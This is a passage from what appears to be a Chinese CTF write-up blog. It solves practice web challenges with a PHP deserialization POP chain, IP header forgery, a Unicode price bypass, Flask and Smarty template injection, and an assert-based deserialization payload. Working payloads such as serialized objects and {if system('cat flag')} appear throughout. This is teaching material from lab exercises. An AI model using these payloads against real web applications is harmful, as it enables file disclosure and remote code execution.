&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义一个append函数<br>有个include，我们可以用伪协议来获得flag.php的内容，而include需要__invoke方法来调用，__invoke触发方法为：当尝试以调用函数的方式调用一个对象时，方法会被自动调用。。</p><p>再来分析Show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先看__toString方法，是个输出点</p><p>最后分析Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>__get()方法，(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)，而Modifier类中有私有属性，这两个类配合一下</p><p>思路：<br>首先使</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$var</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>由于protect被保护的变量类外部无法访问，所以在类里面定义<br>然后使用Test类里的__get方法调用Modifier类中的__invoke方法，使$p这个变量为Modifier这个对象就可以调用__invoke方法，最后使用Show这个类里的__toString方法输出被包含的flag<br>使用Test类中的__Get方法调用Modifier类中的__invoke方法很简单<br>使Test-&gt;p&#x3D;new Modifier();<br>Show中__wakeup方法 ，preg_match对类中的source进行比较，将它作为字符串，所以就调用了__toString方法<br>__toString是在对象被当成字符串的时候调用<br>所以这里我们需要使Show-&gt;source &#x3D; new Show();<br>即可调用__toString方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;source-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="/images/MQ083D130OO6OYCG15V.png"><br>这里的buy it now 是有超链接的<br>微信扫一扫先<br><img src="/images/YNUL3D1EKV4C5VP4.png"><br>拜托！你不会真的想PY到flag吧，这样可是违规的！再好好分析一下界面代码吧<br>好吧，另辟蹊径<br>回到主页面，审计源代码</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>     <span class="hljs-built_in">hash</span> = hex_md5(code);<br>     <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>;<br>   &#125;<br>   <span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> code = document.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>     <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>       <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>         alert(<span class="hljs-string">&quot;您通过了验证！&quot;</span>);<br>         window.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>         alert(<span class="hljs-string">&quot;你的授权码不正确！&quot;</span>);<br>       &#125;<br>     &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;请输入授权码&quot;</span>);<br>     &#125;<br>     <br>   &#125;<br></code></pre></td></tr></table></figure><p>这里有个flag.php，看看能不能直接查看<br><img src="/images/Y1HGFWJWYOPXT3ZN3L.png"><br>重点是这一句话：<br>验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag<br>除了购买者和我自己？<br>伪造IP试试<br><img src="/images/6OLV4250O66RIYHW5SM.png"><br><img src="/images/JFJQBMOYHR56UBL4MK.png"><br>源代码中查看flag</p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/images/HHE63JPRZK5VP8UO.png"><br>看到给的历史输入，还以为是sql注入，注入了半天毛都没有<br>看看源码👀<br><img src="/images/CCBM03PTUN15DEK50F.png"><br>这里提示<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>非常重要<br>但是很多的网站都是utf-8编码，为什么会说这里很重要?<br>回到购买界面，我们输入其他的价格，发现输入10的时候有提示<br><img src="/images/SJJVW90CRI7BP0MK.png"><br>只能输入一个字符<br>一个字符能够购买的就只有前三只独角兽，但是都没有购买成功，想必突破点在第四只独角兽上，先找到一个比1337大的数<br>当什么都不输入直接购买时会出现以下提示<br><img src="/images/435G6RU5DA6HCN26.png"><br>看一下 unicodedata.numeric这个函数，他的参数是price<br>前端html使用的是utf-8，后端python处理使用的是unicode，编码不一致造成了转码问题<br><img src="/images/LQ1B771Y202IYPQOL.png"><br><img src="/images/D585S3GQB0CTVOHB9L.png"><br>传入万试试<br><img src="/images/IZ87OSEJ633X4O7QBBE.png"><br>flag成功回显<br>如果不想用万的话可以去找一个Unicode编码网站<br><a href="https://www.compart.com/en/unicode">传送门</a><br>例如输入ten thousand<br><img src="/images/NMW9LJLO5NYALOX.png"><br><img src="/images/RT4UKBT5P80RZT5.png"><br>找到一个Numeric Value大于等于10000的数值<br>直接复制上面的特殊符号或者下面的UTF-8 Encoding<br>找到UTF-8 Encoding：0xE1 0x8D 0xBC<br>将0x替换成%<br><img src="/images/LLNDIZB7VBGLF9K12S.png"><br>购买得到flag</p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<span class="hljs-comment">#创建Flask应用实例、初始化Flask应用</span><br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#从环境变量中获取名为&#x27;FLAG&#x27;的值，然后将其存储在Flask应用的配置中</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-comment">#定义根路由&#x27;/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<span class="hljs-comment">#返回当前文件的内容</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><span class="hljs-comment">#定义路由 /shrine/&lt;path:shrine&gt;，使用 Jinja2 模板渲染路径参数：</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<span class="hljs-comment">#当访问 /shrine/&lt;path:shrine&gt; 路径时，会调用 shrine 函数</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>首先在shrine路径下测试ssti能否正常执行</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/LK7HQZB5I2M18ONT.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">safe_jinja</span>(s):<br>       s = s.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>       return <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) for c in blacklist]) + s<br><br>   return flask.<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe_jinja</span>(shrine))<br></code></pre></td></tr></table></figure><p>再来分析这段代码<br>这段代码使用了一个黑名单blacklist,其中包含了要在传入的字符串s中被替换的一些字符串(在这里config和self)。对于每个黑名单的字符串c，它都会生成一个jinja2模板语法的字符串<code>&#123;&#123;% set c=None %&#125;&#125;</code>，然后将这些字符串连接到原始的字符串s之后<br>python还有一些内置函数比如url_for和get_flashed_messages<br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;<span class="hljs-regexp">//</span>返回视图函数的url，对对象的全局命名空间的访问<br></code></pre></td></tr></table></figure><p><img src="/images/PT26X6LGOGY57QTEN2.png"><br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>current_app 允许你获取当前应用的一些属性和配置信息<br><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br>-&gt;获取flag<br></code></pre></td></tr></table></figure><p><strong>config不是被列为黑名单了嘛？？？</strong><br>假设shrine为<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br>然后传递给safe_jinja函数，在这个情况下，blacklist包含了config,所以生成的jinja2模板字符串如下</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">set</span> <span class="hljs-attr">config</span>=None %&#125;&#125;</span><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这个字符串中的<code>&#123;&#123;% set config=None %&#125;&#125;</code>部分是为了尝试设置config变量为None,但由于Jinja2的语法，这个设置操作在字符串中仅仅是一个字符串的一部分，而不会真正地执行。</p><p>因此，尽管看起来好像config被设置为None,实际上Jinja2只是把这部分当作普通的文本对待，并没有执行它。因此，在渲染模板时，config的值仍然是<code>url_for.__globals__[&#39;current_app&#39;].config</code>,而没有被设置为None<br><img src="/images/XCUV93B45O8I24U3VXW2.png"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>检索源代码<br><img src="/images/U30NAQ0SZE9VDQ7O.png"><br>找到一个php文件，进去康康</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure><p>没啥好分析的，直接赋值序列化</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$c</span>-&gt;b=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>echo serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-regexp">//</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HelloPhp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在对象被销毁时，__destruct会被调用<br>也就是</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);</span><br></code></pre></td></tr></table></figure><p>assert与eval的功能基本相同，但不需要后面加<code>;</code><br>还有参数source不能出现，不然die(0)会直接结束脚本<br>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-symbol">O:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;HelloPhp&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;a&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">9</span><span class="hljs-symbol">:<span class="hljs-string">&quot;phpinfo()&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;b&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;assert&quot;</span></span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/YCMFTEQZQ5AMTYVRU31.png"><br>详细–&gt;<a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">eval与assert</a>&lt;–</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p><img src="/images/G35F0ZJN35S68IL67.png"><br>检索页面发现有个显示ip的地方<br>先康康能不能xff伪造下ip<br><img src="/images/J3D1FCKLD0WT7OLY5XN.png"><br>这时看到最下面显示<br>Build With Smarty !<br>Smarty是一个PHP的模板引擎，提供让程序逻辑与页面显示（HTML&#x2F;CSS）代码分离的功能。该框架出现过SSTI漏洞<br>ssti先上一张图<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png"><br>测试<code>a&#123;*comment*&#125;b</code><br><img src="/images/RJAZ6GRSWBE8ZLSC6R.png"><br>按照正常逻辑，应该用php语言去查找flag。一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30<br><img src="/images/DY839XW0HNZF8LACB1OZG.png"><br>在Smarty3的官方手册里有以下描述:<br>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。所以只能另找方法<br><strong>{if}标签</strong><br>官方文档中看到这样的描述：<br>smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}也可以使用{else}和{elseif}.全部的PHP条件表达式和函数都可以在if内使用，如||*,or,&amp;&amp;,and,is_array()，等等。。。所以也可以使用<code>&#123;if show_source(&quot;/flag&quot;)&#125;&#123;/if&#125;</code>来获得flag<br><img src="/images/NGOSYM3EL5ZN0KAAQ.png"><br>或是</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> system(&#x27;cat flag&#x27;)&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><br></code></pre></td></tr></table></figure><p>在前面的模板图中我们还可以使用另一种方法<br>xff中输入</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span 